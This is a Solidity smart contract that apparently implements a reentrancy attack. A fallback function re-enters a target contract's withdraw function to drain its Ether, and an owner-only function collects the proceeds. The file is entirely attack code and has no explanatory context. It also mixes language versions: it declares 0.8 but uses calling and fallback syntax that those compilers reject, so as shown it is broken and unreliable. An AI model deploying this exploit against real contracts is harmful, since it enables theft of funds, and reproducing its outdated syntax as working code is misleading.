pragma solidity ^0.8.0;

contract Dangerous {
    function withdraw(uint amount) public;
    function depositMoney() public payable;
}

contract AttackingContract {
    address public owner;
    Dangerous public vulnerableContract;

    constructor(address _contractAddr) public {
        owner = msg.sender;
        vulnerableContract = Dangerous(_contractAddr);
    }

    function deposit() public payable {
        vulnerableContract.depositMoney.value(msg.value)();
    }

    // This fallback is triggered when Ether is received
    function () external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    function attack() public {
        vulnerableContract.withdraw(1 ether);
    }

    function withdrawProfits() public {
        owner.transfer(address(this).balance);
    }
}